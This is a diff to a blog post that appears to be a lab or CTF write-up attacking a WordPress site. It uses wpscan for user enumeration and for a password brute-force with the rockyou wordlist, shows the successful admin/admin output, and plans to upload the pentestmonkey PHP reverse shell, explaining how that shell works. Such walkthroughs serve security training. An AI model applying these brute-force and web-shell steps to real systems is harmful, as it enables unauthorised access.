@@ -168,7 +168,23 @@ Now, if can somehow exploit the wordpress site to upload our webshell, we can
 get acess to the system. One of the simpliest ways is to find the user accounts
 and then try to bruteforce the passwords.
 
-Let us try to enumerate the users
+Few of interesting options with `wpscan --enumerate` are
+
+{% highlight console %}
+-e, --enumerate [OPTS]  Enumeration Process
+                         Available Choices:
+                          vp   Vulnerable plugins
+                          ap   All plugins
+                          p    Popular plugins
+                          vt   Vulnerable themes
+                          at   All themes
+                          u    User IDs range. e.g: u1-5
+                               Range separator to use: '-'
+                               Value if no argument supplied: 1-10
+
+{% endhighlight %}
+
+Let us try to enumerate the users based on user ids.
 
 {% highlight console %}
 wpscan --url http://10.10.10.104/secret --enumerate u --api-token SFQsH.....ayIm1ppfZZ8FH0
@@ -188,4 +204,37 @@ wpscan --url http://10.10.10.104/secret --enumerate u --api-token SFQsH.....ayIm
 {% endhighlight %}
 
 Once we have enumerated the users, we can bruteforce the password. We have downloaded
-the wordlist `rockyou-75.txt` from  
+the wordlist `rockyou-75.txt` from [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-75.txt)
+
+{% highlight console %}
+wpscan --url http://10.10.10.104/secret --enumerate u --api-token SFQsH.....ayIm1ppfZZ8FH0 --usernames 'admin' --passwords "/home/student/rockyou-75.txt"
+{% endhighlight %}
+
+{% highlight console %}
+[+] Performing password attack on Wp Login against 1 user/s
+Trying admin / admin Time: 00:03:36 <======================================================> (19815 / 19815) 100.00% Time: 00:03:36
+[SUCCESS] - admin / admin                                                                                                          
+
+[i] Valid Combinations Found:
+ | Username: admin, Password: admin
+{% endhighlight %}
+
+With *username* and *password* under our kitty, we can use them to upload the `webshells`. There is a lot of material
+avilable to create a webshell in php. You can refer [hacksland.net](https://hacksland.net/build-a-simple-web-shell/) 
+for a simple webshell.
+
+However, for our purpose we will be using the webshell provided by (pentestmonkey)[https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php]. Just to provide an insight into the 
+working of this webshell, it broadly does following :
+
+  1. Creates a deamon in the victim machine, which in turn makes a reverse TCP connection with the  attacker machine. `deamons` are in `unix/linux` what `services` are in windows.
+  2. Opens bash shell on victim machine.
+  3. The deamon receives the commands from the attacker machine and passes them to the bash shell through pipes.
+  4. The response received from the bash shell is passed to the deamon which inturn sends it to the attacker machine through
+reverse TCP connection.
+
+
+
+
+
+
+
